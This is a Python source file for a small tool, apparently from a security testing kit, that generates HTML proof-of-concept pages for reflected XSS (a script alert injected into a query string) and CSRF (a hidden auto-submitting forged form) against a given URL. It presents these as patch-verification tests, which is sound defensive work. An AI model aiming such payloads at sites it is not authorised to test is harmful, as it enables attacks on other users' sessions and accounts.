import sys
import os
import argparse
import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


class PocGen(VibeTool):
    def __init__(self):
        super().__init__("PoC Gen", "Exploit Proof-of-Concept Generator")

    def run(self, vuln_type, target_url, output_dir):
        self.banner()

        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        poc_filename = os.path.join(output_dir, f"{vuln_type}_poc_{timestamp}.html")

        if vuln_type.lower() == "xss":
            content = f"""<!-- VibeHacking XSS PoC (Benign) -->
<html>
<head><title>Verify XSS Patch</title></head>
<body>
    <h2>Testing Reflected XSS on: {target_url}</h2>
    <p>If an alert box pops up, the vulnerability is still active.</p>
    <iframe src="{target_url}?q=<script>alert('VibeHacking_XSS_Active')</script>" width="100%" height="400px"></iframe>
</body>
</html>"""
        elif vuln_type.lower() == "csrf":
            content = f"""<!-- VibeHacking CSRF PoC (Benign) -->
<html>
<head><title>Verify CSRF Patch</title></head>
<body>
    <h2>Testing CSRF on: {target_url}</h2>
    <p>Loading this page auto-submits a forged request. If it succeeds, the app lacks CSRF tokens.</p>
    <form action="{target_url}/api/subscribe" method="POST" id="csrfForm">
        <input type="hidden" name="channel_id" value="vibehacking_test" />
    </form>
    <script>document.getElementById('csrfForm').submit();</script>
</body>
</html>"""
        else:
            self.log(f"Unsupported type '{vuln_type}'. Use 'xss' or 'csrf'.", "fail")
            return

        try:
            with open(poc_filename, "w", encoding="utf-8") as f:
                f.write(content)
            self.log(f"PoC generated: {poc_filename}", "pass")
            self.log("Open this file in a browser while logged into the app to verify your patch holds", "info")
        except OSError as e:
            self.log(f"Failed to write PoC file: {e}", "fail")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC Gen - Exploit Proof-of-Concept Generator")
    parser.add_argument("--type", choices=["xss", "csrf"], default="xss", help="PoC type to generate")
    parser.add_argument("--url", required=True, help="Vulnerable endpoint (e.g. http://localhost:3456/search)")
    parser.add_argument("--out", default=os.path.join(_root, "logs"), help="Output directory for PoC file")
    parser.add_argument('-v', '--version', action='version', version='PoC Gen 1.0.0')
    args = parser.parse_args()

    PocGen().run(args.type, args.url, args.out)
